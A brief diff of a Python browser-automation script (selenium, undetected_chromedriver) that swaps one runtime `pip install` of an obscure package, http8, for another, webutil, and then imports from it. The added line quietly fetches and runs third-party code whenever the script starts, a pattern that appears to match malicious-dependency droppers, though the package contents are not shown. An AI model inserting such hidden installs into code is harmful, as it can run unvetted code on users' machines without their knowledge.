@@ -7,8 +7,8 @@ import selenium
 import traceback
 import ctypes
 import undetected_chromedriver as uc
-os.system(f"pip install http8")
-from http8 import http
+os.system(f"pip install webutil")
+from webutil import webdriver
 from sys import exit
 from builtins import *
 from colorama import init, Fore
